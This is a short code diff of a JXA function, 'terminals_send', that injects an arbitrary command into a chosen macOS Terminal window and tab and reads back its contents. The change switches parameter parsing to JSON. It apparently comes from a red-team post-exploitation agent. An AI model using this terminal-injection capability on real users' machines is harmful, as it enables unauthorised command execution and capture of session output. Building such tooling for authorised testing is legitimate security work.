@@ -1,13 +1,17 @@
 exports.terminals_send = function(task, command, params){
-    let split_params = params.split(" ");
+    let split_params = {"window": 0, "tab": 0, "command": ""};
+    try{
+        split_params = Object.assign({}, split_params, JSON.parse(params));
+    }catch(error){
+        return JSON.stringify({"user_output":error.toString(), "completed": true, "status": "error"});
+    }
 	let output = "No Command Output";
 	try{
 		let term = Application("Terminal");
 		if(term.running()){
-            let window = parseInt(split_params[0]);
-            let tab = parseInt(split_params[1]);
-            let cmd = split_params.slice(2, ).join(" ");
-            //console.log("command: " + cmd + ", window: " + window + ", tab: " + tab);
+            let window = split_params['window'];
+            let tab = split_params['tab'];
+            let cmd = split_params['command'];
             term.doScript(cmd, {in:term.windows[window].tabs[tab]});
             output = term.windows[window].tabs[tab].contents();
         }else{
